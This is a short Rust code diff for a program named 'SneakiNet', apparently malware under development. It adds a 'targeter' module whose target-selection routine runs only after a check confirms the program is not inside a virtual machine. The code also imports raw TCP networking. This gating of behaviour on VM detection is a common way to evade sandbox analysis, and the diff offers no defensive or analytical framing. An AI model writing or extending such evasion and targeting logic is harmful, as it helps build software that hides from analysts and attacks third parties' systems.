@@ -1,4 +1,5 @@
 use vm_detector::CheckVM;
+use targeter::targeter;
 use std::{net::TcpStream, io::{Read,Write}};
 
 
@@ -78,9 +79,18 @@ impl SneakiNet {
 fn main() {
     let id = 1;
     let mut t = SneakiNet{ id };
+    let mut tgtr = targeter::Targeter::new(); 
+
+    // check if we are in a VM
     if t.check_vm(){
         println!("WE IN A MF VM LOL");
     } else {
         println!("We good :)");
+        let rc = match tgtr.determine_targets(){
+            Ok(i) => i,
+            Err(e) => panic!("Caught error: {}", e)
+        };
+
+        println!("Return code {}", rc);
     }
 }
